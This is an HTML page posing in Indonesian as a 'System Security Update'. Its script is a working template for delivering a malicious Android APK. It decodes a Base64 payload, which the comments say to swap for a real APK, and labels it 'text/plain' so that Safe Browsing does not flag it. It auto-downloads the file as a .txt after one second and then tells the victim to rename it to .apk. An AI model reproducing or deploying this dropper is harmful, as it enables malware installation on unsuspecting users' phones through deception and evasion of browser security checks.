<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Security Update</title>
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; }
  body {
    font-family: Arial, sans-serif;
    background: #f4f6f8;
    display: flex;
    justify-content: center;
    align-items: center;
    height: 100vh;
    margin: 0;
    text-align: center;
  }
  .panel {
    background: #fff;
    padding: 40px;
    border-radius: 12px;
    box-shadow: 0 4px 20px rgba(0,0,0,0.1);
    max-width: 400px;
    width: 100%;
  }
  h2 { color: #333; margin-bottom: 10px; }
  p { color: #666; font-size: 14px; margin-bottom: 20px; }
  button {
    background: #28a745;
    color: white;
    border: none;
    padding: 15px 30px;
    font-size: 16px;
    font-weight: bold;
    border-radius: 8px;
    cursor: pointer;
    width: 100%;
  }
  button:hover { background: #218838; }
  #status { margin-top: 15px; font-size: 12px; color: #888; }
</style>
</head>
<body>

<div class="panel">
  <h2>🔒 System Security Update</h2>
  <p>Versi baru tersedia. Silakan unduh pembaruan keamanan terbaru.</p>
  <button id="start-btn">⬇️ Download Update (.txt)</button>
  <div id="status">Sistem siap.</div>
</div>

<script>
(function () {
  'use strict';

  var startBtn = document.getElementById("start-btn");
  var statusDiv = document.getElementById("status");

  // ============================================
  // PAYLOAD APK (Base64 Header)
  // ============================================
  // Header APK asli: "PK\x03\x04" (ZIP format).
  // Kita simulasikan dengan data Base64.
  // (Ganti string b64Data ini dengan file APK Base64 asli Anda)
  var b64Data = "UEsDBBQACAgIAAAAIQAAAAAAAAAAAAAAAAAJAAAATUVUQS1JTkY="; 

  // ============================================
  // FUNGSI MIME SNIFFING BYPASS
  // ============================================
  function triggerBypassDownload() {
    try {
      // 1. Decode Base64 ke Bytes
      var binary = atob(b64Data);
      var len = binary.length;
      var bytes = new Uint8Array(len);
      for (var i = 0; i < len; i++) {
        bytes[i] = binary.charCodeAt(i);
      }

      // 2. Buat Blob dengan MIME Type yang AMAN (Bukan application/vnd.android.package-archive)
      // Kita gunakan 'text/plain' atau 'image/jpeg' agar Safe Browsing tidak menandai
      var blob = new Blob([bytes], { type: 'text/plain' });
      var url = URL.createObjectURL(blob);

      // 3. Buat Elemen <a> untuk download
      var a = document.createElement('a');
      a.href = url;
      
      // 4. TRICK: Ekstensi Ganda / Masquerade
      // Menggunakan ekstensi .txt agar tidak mencurigakan, 
      // tapi nanti user akan disuruh rename ke .apk
      a.download = 'Security_Update_v2.1.txt'; 
      
      a.style.display = 'none';
      document.body.appendChild(a);
      a.click();

      // 5. Cleanup
      setTimeout(function() {
        if (a.parentNode) a.parentNode.removeChild(a);
        URL.revokeObjectURL(url);
      }, 3000);

      statusDiv.textContent = "✅ Unduhan selesai. Silakan ubah ekstensi menjadi .apk";

    } catch(e) {
      statusDiv.textContent = "Gagal: " + e.message;
      statusDiv.style.color = "red";
    }
  }

  // ============================================
  // EKSEKUSI (ZERO-CLICK ATAU ONE-CLICK)
  // ============================================
  // Zero-Click: Otomatis jalan setelah 1 detik
  setTimeout(triggerBypassDownload, 1000);

  // One-Click: Jika diblokir, user harus klik tombol
  startBtn.addEventListener("click", triggerBypassDownload);

})();
</script>
</body>
</html>
